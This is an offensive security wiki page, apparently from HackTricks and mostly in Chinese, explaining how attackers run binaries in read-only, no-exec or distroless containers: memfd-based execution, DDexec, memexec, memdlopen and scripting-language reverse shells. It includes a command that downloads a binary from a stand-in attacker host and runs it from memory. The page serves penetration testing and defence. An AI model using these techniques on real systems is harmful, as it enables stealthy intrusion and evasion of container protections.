# Bypass FS protections: read-only / no-exec / Distroless

{{#include ../../../../banners/hacktricks-training.md}}

## Videos

在以下视频中，你可以找到本页提到的 techniques 的更深入讲解：<sup>[[1]](#references)[[2]](#references)</sup>

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)<sup>[[1]](#references)</sup>
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)<sup>[[2]](#references)</sup>

## read-only / no-exec 场景

现在越来越常见的是，linux machines 使用 **read-only (ro) file system protection** 挂载，尤其是在 containers 中。这是因为只需在 `securitycontext` 中设置 **`readOnlyRootFilesystem: true`**，就可以轻松地以 ro file system 运行 container：

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

不过，即使 file system 以 ro 方式挂载，**`/dev/shm`** 仍然是可写的，因此说我们无法向 disk 中写入任何内容并不准确。但此目录会以 **no-exec protection** 挂载，所以如果你在这里下载一个 binary，**将无法执行它**。

> [!WARNING]
> 从 red team 的角度来看，这使得下载并执行系统中尚不存在的 binaries 变得**复杂**（例如 backdoors 或 `kubectl` 之类的 enumerators）。

## 最简单的 bypass：Scripts

注意，我提到的是 binaries；只要 interpreter 位于 machine 中，你就可以**执行任何 script**，例如在存在 `sh` 时执行 **shell script**，或者在安装了 `python` 时执行 **python** **script**。

不过，仅靠这一点还不足以执行你的 binary backdoor 或其他可能需要运行的 binary tools。

## Memory Bypasses

如果你想执行一个 binary，但 file system 不允许这样做，最佳方式是**从 memory 中执行它**，因为这些 **protections 不适用于 memory**。

### FD + exec syscall bypass

如果 machine 中有一些功能强大的 script engines，例如 **Python**、**Perl** 或 **Ruby**，你可以将要执行的 binary 下载到 memory 中，将其存储在 memory file descriptor（`create_memfd` syscall）中；该 file descriptor 不会受到这些 protections 的限制，然后调用 **`exec` syscall**，指定该 **fd 作为要执行的 file**。

你可以轻松使用 [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) project 来完成这一操作。你可以向它传入一个 binary，它会使用指定的 language 生成一个 script，其中包含经过压缩和 b64 编码的 **binary**，以及用于在通过调用 `create_memfd` syscall 创建的 **fd** 中**解码和解压缩它**的 instructions，最后调用 **exec** syscall 来运行它。

> [!WARNING]
> 这对 PHP 或 Node 等其他 scripting languages 不起作用，因为它们没有从 script 中调用 raw syscalls 的 d**efault way**，所以无法调用 `create_memfd` 来创建用于存储 binary 的 **memory fd**。
>
> 此外，在 `/dev/shm` 中通过 file 创建 **regular fd** 也不起作用，因为你无法运行它，**no-exec protection** 会生效。

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) 是一种通过覆盖自身 **`/proc/self/mem`** 来**修改自身 process memory** 的 technique。

因此，通过控制 process 正在执行的 **assembly code**，你可以写入 **shellcode**，并使 process “变异”以**执行任意 code**。

> [!TIP]
> **DDexec / EverythingExec** 允许你从 **memory** 中加载并**执行**自己的 **shellcode** 或**任何 binary**。
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
如需了解有关此技术的更多信息，请查看 Github 或：

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) 是 DDexec 的自然演进。它是一个 **被 daemon 化的 DDexec shellcode**，因此每次想要 **运行不同的 binary** 时，都不需要重新启动 DDexec；你只需通过 DDexec technique 运行 memexec shellcode，然后与这个 daemon **通信，以传递要加载和运行的新 binary**。

你可以在 [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php) 中找到如何使用 **memexec 从 PHP reverse shell 执行 binary** 的示例。

### Memdlopen

与 DDexec 用途类似，[**memdlopen**](https://github.com/arget13/memdlopen) technique 提供了一种**更简单的方式，将 binary 加载到内存中**，以便稍后执行。它甚至可以加载带有依赖项的 binary。

## Distroless Bypass

如需专门了解 **distroless 的实际含义**、它何时有帮助、何时没有帮助，以及它如何改变容器中的 post-exploitation tradecraft，请查看：

{{#ref}}
../../../containers-namespaces/container-security/distroless.md
{{#endref}}

### What is distroless

Distroless 容器只包含**运行特定 application 或 service 所需的最低限度组件**，例如 libraries 和 runtime dependencies，但不包含 package manager、shell 或 system utilities 等较大的组件。

Distroless 容器的目标是**消除不必要的组件，从而减少容器的 attack surface**，并尽量减少可被利用的 vulnerabilities 数量。

### Reverse Shell

在 distroless 容器中，你可能**甚至找不到 `sh` 或 `bash`** 来获取常规 shell。你也不会找到 `ls`、`whoami`、`id` 等 binary……也就是你通常在系统中运行的所有工具。

> [!WARNING]
> 因此，你将**无法获取 reverse shell**，也无法像平常一样**枚举**系统。

不过，如果被攻陷的容器运行的是例如 flask web application，那么其中会安装 python，因此你可以获取一个 **Python reverse shell**。如果运行的是 node，则可以获取 Node rev shell；对于大多数 **scripting language**，情况也是一样的。

> [!TIP]
> 你可以使用 scripting language 的能力来**枚举系统**。

如果没有 **`read-only/no-exec`** protections，你可以利用 reverse shell 将 binary **写入文件系统**并**执行**它们。

> [!TIP]
> 不过，这类容器通常会存在这些 protections，但你可以使用**前面介绍的 memory execution techniques 来绕过它们**。

你可以在 [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE) 中找到如何**利用某些 RCE vulnerabilities** 获取 scripting language **reverse shell**，并从内存中执行 binary 的**示例**。

## References

- [1] [DEF CON 31 - 探索 Linux 内存操作以实现隐蔽和规避](https://www.youtube.com/watch?v=poHirez8jk4)
- [2] [使用 DDexec-ng 和 in-memory dlopen() 进行隐蔽入侵 - HackTricks Track 2023](https://www.youtube.com/watch?v=VM_gjjiARaU)

{{#include ../../../../banners/hacktricks-training.md}}
